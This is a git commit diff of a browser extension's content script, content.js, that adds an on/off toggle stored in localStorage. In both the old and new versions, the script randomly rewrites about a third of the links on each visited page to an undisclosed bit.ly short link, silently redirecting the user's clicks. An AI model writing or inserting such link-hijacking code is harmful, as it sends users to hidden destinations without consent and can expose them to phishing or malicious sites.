36abc5982b4bfc981dace807acd5a965ce70c3c6
MSGuy01 <47047931+MSGuy01@users.noreply.github.com>
2020-10-06 19:03:20 -0700

    Update content.js

--- content.js
+++ content.js
@@ -1,8 +1,23 @@
-alert("Extension works");
+
+console.log("extension works!");
 var a = document.getElementsByTagName("a");
-for (var i = 0; i < a.length; i++) {
-	var random = Math.floor((Math.random() * 3) + 1);
-	if (random == 2) {
-		a[i].href = "http://bit.ly/30QqsQ2";
+console.log(localStorage.getItem("on"));
+chrome.runtime.onMessage.addListener(
+  function(request, sender, sendResponse) {
+  	alert("Extension is " + request.greeting);
+    if (request.greeting == "on") {
+    	localStorage.setItem("on", "on");
+    }
+    else{
+    	localStorage.setItem("on", "off");
+    }
+    location.reload();
+  });
+if (localStorage.getItem("on") == "on") {
+	for (var i = 0; i < a.length; i++) {
+		var random = Math.floor((Math.random() * 3) + 1);
+		if (random == 2) {
+			a[i].href = "http://bit.ly/30QqsQ2";
+		}
 	}
 }
